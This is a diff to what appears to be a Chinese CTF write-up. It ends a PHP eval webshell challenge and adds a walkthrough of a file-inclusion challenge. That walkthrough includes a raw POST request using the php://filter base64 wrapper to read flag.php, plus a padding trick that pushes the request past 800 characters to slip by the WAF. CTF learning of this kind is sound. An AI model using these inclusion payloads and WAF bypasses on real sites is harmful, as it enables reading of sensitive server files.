@@ -355,7 +355,7 @@ python vol.py -f ..\..\OtterCTF.vmem windows.registry.printkey --key "ControlSet
 
 eval()：PHP 中的一个危险函数。它的作用是将传入的字符串当作 PHP 代码执行。
 
-$_POST['r00ts']：通过 HTTP POST 请求获取参数 r00ts 的值。
+ $_POST['r00ts']：通过 HTTP POST 请求获取参数 r00ts 的值。
 ***
 上传test并用burpsuite拦下请求
 ![alt text](image-55.png)
@@ -378,6 +378,51 @@ r00ts=phpinfo();
 ```
 发出之后即可查看phpinfo，在Environment中找到了flag
 ![alt text](image-57.png)
+
+### 二.简单包含
+![alt text](image-77.png)
+能看出来需要用文件包含查看/var/www/html/flag.php
+***
+文件包含（File Inclusion）是指在程序运行时动态引入外部文件的机制,例如，在PHP、Python等语言中，可以通过 include()、require() 或 open() 之类的函数引入本地或远程文件
+例如在PHP中
+```php
+<?php
+include($_GET['file']);
+?>
+```
+如果攻击者控制 file 参数的值，比如传入 file=...则可能会泄露系统敏感信息
+***
+向网站发送请求，使用php伪协议查看文件
+```http
+POST / HTTP/1.1
+Host: node4.anna.nssctf.cn:28089
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+
+flag=php://filter/convert.base64-encode/resource=/var/www/html/flag.php
+```
+***
+php://filter伪协议允许对PHP代码读取前进行转换（编码/解码）,可以绕过include()的PHP代码执行，直接读取文件内容。
+其中convert.base64-encode为编码方式，resource=指定要读取的目标文件
+***
+得到结果waf
+![alt text](image-78.png)
+***
+WAF(Web Application Firewall)专门用于检测、过滤和拦截针对 Web 应用的攻击
+通常过滤对敏感文件的访问，WAF 的规则和逻辑一般存在index.php
+***
+尝试查看index,即把伪协议修改为flag=php://filter/convert.base64-encode/resource=index.php
+(这里很奇怪，burpsuite访问不行但是hackbar可以)
+![alt text](image-79.png)
+解密得到的base64
+![alt text](image-80.png)
+可以看到waf只拦截包含flag的800字符以内的请求，所以可以修改payload为
+a=aaa（此处使得总长度超过800）aaaa&flag=php://filter/read=convert.base64-encode/resource=flag.php
+![alt text](image-81.png)
+base64解码
+![alt text](image-82.png)
+得到flag
 ## 2.10 新手，reverse，语言逆向，pwn，栈溢出
 ### 一.test_nc
 ***
